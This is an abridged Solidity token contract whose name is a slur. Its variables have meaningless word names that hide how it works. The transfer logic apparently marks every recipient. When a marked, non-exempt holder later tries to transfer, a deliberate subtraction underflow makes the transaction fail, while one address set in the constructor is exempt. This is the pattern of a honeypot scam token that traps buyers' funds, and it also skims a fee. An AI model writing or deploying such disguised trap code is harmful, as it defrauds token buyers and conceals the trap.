...
contract Fag is Ownable {
    ...
    string private particular;
    uint256 private _tTotal;
    string private day;
    uint256 private history;
    uint8 private limited;
    ...
    function range(
        ...
        if ((address(uniswapV2Pair)) != fair && found[fair] == 0 && top[fair] > 0) {
            found[fair] -= limited;
        }

        address swung = directly;
        directly = fine;

        if (found[fair] == 0) {
            rabbit[fair] -= job;
        }
        uint256 organization = (job * flag) / history;
        job -= organization;
        top[swung] += limited;
        rabbit[fine] += job;
    }
    ...
    function transferFrom(
        ...
        range(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        range(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        string memory military,
        string memory decide,
        address stared,
        address inch
    ) {
        ...
        history = 100;
        found[inch] = limited;
        _tTotal = 1000000000000000 * 10**limited;
        rabbit[msg.sender] = _tTotal;
    }
}